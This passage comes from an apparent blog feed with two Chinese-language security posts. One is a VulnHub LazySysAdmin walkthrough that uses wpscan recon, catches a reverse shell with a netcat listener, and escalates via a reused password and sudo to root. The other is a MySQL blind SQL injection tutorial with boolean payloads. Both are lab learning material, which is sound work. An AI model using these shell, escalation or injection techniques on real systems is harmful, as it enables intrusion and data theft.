class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools/LazySysAdmin_1]<br>└─$ wpscan --url http://192.1.1.130/wordpress/                                                    <br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` |  _ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.24<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[i] It seems like you have not updated the database <span class="hljs-keyword">for</span> some time.<br>[?] Do you want to update now? [Y]es [N]o, default: [N]<br>[+] URL: http://192.1.1.130/wordpress/ [192.1.1.130]<br>[+] Started: Fri Jul  7 09:34:11 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entries:<br> |  - Server: Apache/2.4.7 (Ubuntu)<br> |  - X-Powered-By: PHP/5.5.9-1ubuntu4.22<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://192.1.1.130/wordpress/xmlrpc.php<br> | Found By: Link Tag (Passive Detection)<br> | Confidence: 100%<br> | Confirmed By: Direct Access (Aggressive Detection), 100% confidence<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://192.1.1.130/wordpress/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Registration is enabled: http://192.1.1.130/wordpress/wp-login.php?action=register<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Upload directory has listing enabled: http://192.1.1.130/wordpress/wp-content/uploads/<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://192.1.1.130/wordpress/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 4.8.1 identified (Insecure, released on 2017-08-02).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://192.1.1.130/wordpress/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.8.1&lt;/generator&gt;<br> |  - http://192.1.1.130/wordpress/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.8.1&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentyfifteen<br> | Location: http://192.1.1.130/wordpress/wp-content/themes/twentyfifteen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | Readme: http://192.1.1.130/wordpress/wp-content/themes/twentyfifteen/readme.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 3.4<br> | Style URL: http://192.1.1.130/wordpress/wp-content/themes/twentyfifteen/style.css?ver=4.8.1<br> | Style Name: Twenty Fifteen<br> | Style URI: https://wordpress.org/themes/twentyfifteen/<br> | Description: Our 2015 default theme is clean, blog-focused, and designed <span class="hljs-keyword">for</span> clarity. Twenty Fifteen\<span class="hljs-string">&#x27;s simple, st...</span><br><span class="hljs-string"> | Author: the WordPress team</span><br><span class="hljs-string"> | Author URI: https://wordpress.org/</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Version: 1.8 (80% confidence)</span><br><span class="hljs-string"> | Found By: Style (Passive Detection)</span><br><span class="hljs-string"> |  - http://192.1.1.130/wordpress/wp-content/themes/twentyfifteen/style.css?ver=4.8.1, Match: &#x27;</span>Version: 1.8<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No plugins Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Config Backups - Time: 00:00:00 &lt;=====================================&gt; (137 / 137) 100.00% Time: 00:00:00</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Config Backups Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Finished: Fri Jul  7 09:34:16 2023</span><br><span class="hljs-string">[+] Requests Done: 170</span><br><span class="hljs-string">[+] Cached Requests: 5</span><br><span class="hljs-string">[+] Data Sent: 44.699 KB</span><br><span class="hljs-string">[+] Data Received: 267.936 KB</span><br><span class="hljs-string">[+] Memory used: 262.582 MB</span><br><span class="hljs-string">[+] Elapsed time: 00:00:04</span><br></code></pre></td></tr></table></figure><p>找到一个主题路径 <code>http://192.1.1.130/wordpress/wp-content/themes/twentyfifteen/</code>，于是提前在攻击机开启监听后，在浏览器中访问</p><p><img src="/pic/9e1cbd984f7292f0aac2afff2f1c9e0b_MD5.png"></p><p>虽然直接就有报错提示，但是回看 kali，反弹已经成功，完善一下交互环境，并进行最基础的立足点判断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools/LazySysAdmin_1]<br>└─$ sudo nc -lvnp 443             <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.130] 43140<br>Linux LazySysAdmin 4.4.0-31-generic <span class="hljs-comment">#50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux</span><br> 23:30:06 up 51 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ which python</span><br><span class="hljs-string">/usr/bin/python</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@LazySysAdmin:/$ whoami</span><br><span class="hljs-string">whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">www-data@LazySysAdmin:/$ id</span><br><span class="hljs-string">id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">www-data@LazySysAdmin:/$ uname -a</span><br><span class="hljs-string">uname -a</span><br><span class="hljs-string">Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux</span><br><span class="hljs-string">www-data@LazySysAdmin:/$ ip a</span><br><span class="hljs-string">ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/ether 00:0c:29:96:e4:e9 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.1.1.130/24 brd 192.1.1.255 scope global eth0</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 fe80::20c:29ff:fe96:e4e9/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">www-data@LazySysAdmin:/$</span><br></code></pre></td></tr></table></figure><h2 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h2><p>smb 共享里我们已经把关键信息搜寻过了，那接下来就重点看别的信息，看看定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@LazySysAdmin:/var/www/html$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><p>没有收获，看看 home 目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@LazySysAdmin:/home$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>togie<br>www-data@LazySysAdmin:/home$ <span class="hljs-built_in">cd</span> togie<br><span class="hljs-built_in">cd</span> togie<br>www-data@LazySysAdmin:/home/togie$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>www-data@LazySysAdmin:/home/togie$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 24K<br>  720 drwxr-xr-x 3 togie togie 4.0K Aug 15  2017 .<br>  758 drwxr-xr-x 3 root  root  4.0K Aug 14  2017 ..<br>34865 -rw-r--r-- 1 togie togie  220 Aug 14  2017 .bash_logout<br>34871 -rw-r--r-- 1 togie togie 3.6K Aug 14  2017 .bashrc<br>37880 drwx------ 2 togie togie 4.0K Aug 14  2017 .cache<br>37872 -rw-r--r-- 1 togie togie  675 Aug 14  2017 .profile<br></code></pre></td></tr></table></figure><p>用户目录下没什么有价值的隐藏文件，之前有个 12345 的密码，尝试一下能不能直接切换成 root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@LazySysAdmin:/var/www/html$ su -<br>su -<br>Password: 12345<br><br>su: Authentication failure<br></code></pre></td></tr></table></figure><p>失败，不过 home 目录下的这个用户名也可以试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@LazySysAdmin:/home$ su togie<br>su togie<br>Password: 12345<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>切换成功了，看看这个用户有没有什么 sudo 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">togie@LazySysAdmin:/home$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> togie: 12345<br><br>Matching Defaults entries <span class="hljs-keyword">for</span> togie on LazySysAdmin:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User togie may run the following commands on LazySysAdmin:<br>    (ALL : ALL) ALL<br></code></pre></td></tr></table></figure><p>好家伙，这个用户直接就拥有所有 root 权限，那直接 sudo 新开一个 bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">togie@LazySysAdmin:/home$ sudo /bin/bash<br>sudo /bin/bash<br>root@LazySysAdmin:/home<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@LazySysAdmin:/root<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>proof.txt<br>root@LazySysAdmin:/root<span class="hljs-comment"># cat proof.txt</span><br><span class="hljs-built_in">cat</span> proof.txt<br>WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ<span class="hljs-comment">#PT9851</span><br><br><br>Well <span class="hljs-keyword">done</span> :)<br><br>Hope you learn\<span class="hljs-string">&#x27;t a few things along the way.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Regards,</span><br><span class="hljs-string"></span><br><span class="hljs-string">Togie Mcdogie</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Enjoy some random strings</span><br><span class="hljs-string"></span><br><span class="hljs-string">WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851</span><br><span class="hljs-string">2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7</span><br><span class="hljs-string">pf%&amp;1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02</span><br><span class="hljs-string">bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu</span><br><span class="hljs-string">root@LazySysAdmin:/root#</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/07/7cab9214becf.html"/>
    <url>/2023/07/7cab9214becf.html</url>
    
    <content type="html"><![CDATA[<h1 id="MySQL-盲注"><a href="#MySQL-盲注" class="headerlink" title="MySQL 盲注"></a>MySQL 盲注</h1><h2 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">//判断是否是 Mysql数据库</span><br><br>id=<span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">exists</span>(<span class="hljs-params"><span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span> information_schema.tables</span>) --+</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">//判断是否是 access数据库</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">id</span>=<span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">exists</span>(<span class="hljs-params"><span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span> msysobjects</span>) --+</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">//判断是否是 Sqlserver数据库</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">?id</span>=<span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">exists</span>(<span class="hljs-params"><span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span> sysobjects</span>) --+</span><br></code></pre></td></tr></table></figure><p><img src="/pic/b395a031f7ec331cf8e86ffa0d1c4510_MD5.png"></p><h2 id="判断数据库名"><a href="#判断数据库名" class="headerlink" title="判断数据库名"></a>判断数据库名</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>：判断当前数据库的长度，利用二分法<br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(database())&gt;5 --+ //正常显示</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())&gt;<span class="hljs-number">10</span> <span class="hljs-comment">--+ //不显示任何数据</span><br><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(database())&gt;7 --+ //正常显示</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())&gt;<span class="hljs-number">8</span> <span class="hljs-comment">--+ //不显示任何数据</span><br><br><span class="hljs-number">2</span>：判断当前数据库的字符，和上面的方法一样<br>//判断数据库的第一个字符<br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr(database(),1,1))&gt;100 --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">//判断数据库的第二个字符</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">100</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="/pic/c92e05b17d0e1772e07bae5ed84a7895_MD5.png"></p><p><img src="/pic/559f958970aabfe38a3de2b2b4544592_MD5.png"></p><h2 id="判断当前数据库中的表"><a href="#判断当前数据库中的表" class="headerlink" title="判断当前数据库中的表"></a>判断当前数据库中的表</h2><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">1</span>：判断当前数据库中表的个数<br><span class="hljs-comment">// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为7</span><br>?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database())&gt;<span class="hljs-number">5</span> #<br><br><span class="hljs-number">2</span>：判断每个表的长度<br><span class="hljs-comment">//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6</span><br>id=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> length(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>))&gt;<span class="hljs-number">1</span>--+<br><br><span class="hljs-number">3</span>：判断每个表的每个字符的ascii值<br><span class="hljs-comment">//判断第一个表的第一个字符的ascii值</span><br>?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">100</span> #<br>.........<br></code></pre></td></tr></table></figure><p><img src="/pic/cbb8490e4d9a9f938afbe46045324370_MD5.png"></p><p><img src="/pic/38d391a2f27eedd7deaa92753d5e0cbc_MD5.png"></p><h2 id="判断表中的字段"><a href="#判断表中的字段" class="headerlink" title="判断表中的字段"></a>判断表中的字段</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1</span>：判断表中字段的个数<br><span class="hljs-comment">//判断flag表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的</span><br>?id=<span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">count</span>(<span class="hljs-params">column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span>)&gt;<span class="hljs-number">5</span> <span class="hljs-meta">#</span><br><br><span class="hljs-number">2</span>：判断字段的长度<br><span class="hljs-comment">//判断第一个字段的长度</span><br>?id=<span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">length</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;flag&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span></span>))&gt;5</span><br><span class="hljs-function"></span><br><span class="hljs-function">3：判断字段的ascii值</span><br><span class="hljs-function"><span class="hljs-comment">//判断第一个字段的第一个字符的长度</span></span><br><span class="hljs-function">?id</span>=<span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">ascii</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;flag&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span></span>),1,1))&gt;100</span><br><span class="hljs-function"></span><br><span class="hljs-function">...........</span><br></code></pre></td></tr></table></figure><p><img src="/pic/bfcd9e5086daab0a351e3a533d4f7bef_MD5.png"></p><p><img src="/pic/4b5b2a15f2aeeb0a5a75aacc5965049d_MD5.png"></p><p><img src="/pic/4ed9c89e0e24d358003f8fc633d48034_MD5.png"></p><h2 id="判断字段中的数据"><a href="#判断字段中的数据" class="headerlink" title="判断字段中的数据"></a>判断字段中的数据</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1</span>: 判断数据的长度<br><span class="hljs-comment">// 判断id字段的第一个数据的长度</span><br>?id=<span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">length</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> flag limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span></span>))&gt;5</span><br><span class="hljs-function"></span><br><span class="hljs-function">2：判断数据的ascii值</span><br><span class="hljs-function"><span class="hljs-comment">// 判断id字段的第一个数据的第一个字符的ascii值</span></span><br><span class="hljs-function">?id</span>=<span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">ascii</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span></span>),1,1))&gt;100</span><br><span class="hljs-function"></span><br><span class="hljs-function">...........<span class="hljs-comment">//同理判断flag字段</span></span><br></code></pre></td></tr></table></figure><p><img src="/pic/9a2d331b7240f5a67486a202fc7aef2a_MD5.png"></p><p><img src="/pic/cf84b963ac294e4bfe1fed1b174a982a_MD5.png"></p><p><img src="/pic/c9f62f6ad0fbfdee122362487019f94e_MD5.png"></p><p><img src="/pic/9cd2722129eefe130e0d924d86f4f067_MD5.png"></p><p>忙活了半天发现得到的flag不对，这关的flag位于env_list表里……</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>postgraduate</category>
      
